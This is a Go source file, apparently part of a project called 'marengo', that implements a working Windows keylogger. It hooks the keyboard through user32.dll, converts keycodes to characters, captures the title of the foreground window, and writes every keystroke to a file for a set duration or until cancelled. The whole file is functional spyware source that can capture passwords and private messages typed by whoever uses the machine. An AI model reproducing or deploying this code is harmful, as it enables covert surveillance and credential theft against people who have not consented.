package keylogger

import (
	"context"
	"fmt"
	"os"
	"time"

	"syscall"
	"unsafe"

	"marengo/modules/keylogger/keyboard"
	"marengo/modules/keylogger/types"

	"golang.org/x/sys/windows"
)

var (
	mod = windows.NewLazyDLL("user32.dll")

	procGetKeyState         = mod.NewProc("GetKeyState")
	procGetKeyboardLayout   = mod.NewProc("GetKeyboardLayout")
	procGetKeyboardState    = mod.NewProc("GetKeyboardState")
	procGetForegroundWindow = mod.NewProc("GetForegroundWindow")
	procToUnicodeEx         = mod.NewProc("ToUnicodeEx")
	procGetWindowText       = mod.NewProc("GetWindowTextW")
	procGetWindowTextLength = mod.NewProc("GetWindowTextLengthW")
)

type (
	HANDLE uintptr
	HWND   HANDLE
)

// Gets length of text of window text by HWND
func GetWindowTextLength(hwnd HWND) int {
	ret, _, _ := procGetWindowTextLength.Call(
		uintptr(hwnd))

	return int(ret)
}

// Gets text of window text by HWND
func GetWindowText(hwnd HWND) string {
	textLen := GetWindowTextLength(hwnd) + 1

	buf := make([]uint16, textLen)
	procGetWindowText.Call(
		uintptr(hwnd),
		uintptr(unsafe.Pointer(&buf[0])),
		uintptr(textLen))

	return syscall.UTF16ToString(buf)
}

// Gets current foreground window
func GetForegroundWindow() uintptr {
	hwnd, _, _ := procGetForegroundWindow.Call()
	return hwnd
}

// Runs the keylogger
func Run(key_out chan rune, window_out chan string, ctx context.Context) error {
	keyboardChan := make(chan types.KeyboardEvent, 1024)

	if err := keyboard.Install(nil, keyboardChan); err != nil {
		return err
	}

	defer keyboard.Uninstall()
	// signalChan := make(chan os.Signal, 1)
	// signal.Notify(signalChan, os.Interrupt)

	fmt.Println("start capturing keyboard input")

	for {
		select {
		// case <-signalChan:
		// fmt.Println("Received shutdown signal")
		// os.Ext(0)
		// return nil
		case k := <-keyboardChan:
			if hwnd := GetForegroundWindow(); hwnd != 0 {
				if k.Message == types.WM_KEYDOWN {
					key_out <- VKCodeToAscii(k)
					window_out <- GetWindowText(HWND(hwnd))
				}
			}
		case <-ctx.Done():
			fmt.Println("Done reading")
			return nil
		}
	}
}

// Converts from Virtual-Keycode to Ascii rune
func VKCodeToAscii(k types.KeyboardEvent) rune {
	var buffer []uint16 = make([]uint16, 256)
	var keyState []byte = make([]byte, 256)

	n := 10
	n |= (1 << 2)

	procGetKeyState.Call(uintptr(k.VKCode))

	procGetKeyboardState.Call(uintptr(unsafe.Pointer(&keyState[0])))
	r1, _, _ := procGetKeyboardLayout.Call(0)

	procToUnicodeEx.Call(uintptr(k.VKCode), uintptr(k.ScanCode), uintptr(unsafe.Pointer(&keyState[0])),
		uintptr(unsafe.Pointer(&buffer[0])), 256, uintptr(n), r1)

	if len(syscall.UTF16ToString(buffer)) > 0 {
		return []rune(syscall.UTF16ToString(buffer))[0]
	}
	return rune(0)
}

func KeyLogger(filename string, dura int) error {
	fmt.Println("Start capturing")
	if dura > 3600 {
		return fmt.Errorf("request keylogging cannot over 1h")
	}
	file, err := os.Create(filename)

	if err != nil {
		return err
	}
	defer file.Close()
	defer fmt.Println("end of keykig")
	runes := make(chan rune, 1024)
	windows := make(chan string, 1024)
	ctx, cancel := context.WithCancel(context.Background())
	defer cancel() // cancel when we are finished consuming integers
	go Run(runes, windows, ctx)
	ticker := time.NewTicker(time.Duration(dura) * time.Second)

	for {
		select {
		case <-ticker.C:
			return nil
		case r := <-runes:
			fmt.Fprintf(file, "%s", string(r))
		case <-ctx.Done():
			return nil
		}

	}
}

func KeyLoggerWithContext(filename string, ctx context.Context) error {
	file, err := os.Create(filename)

	if err != nil {
		return err
	}
	defer file.Close()
	defer fmt.Println("end of keylogger without context")
	runes := make(chan rune, 1024)
	windows := make(chan string, 1024)
	go Run(runes, windows, ctx)
	for {
		select {
		case <-ctx.Done():
			return nil
		case r := <-runes:
			if r != 0 {
				fmt.Fprintf(file, "%s", string(r))
			}

		}

	}
}
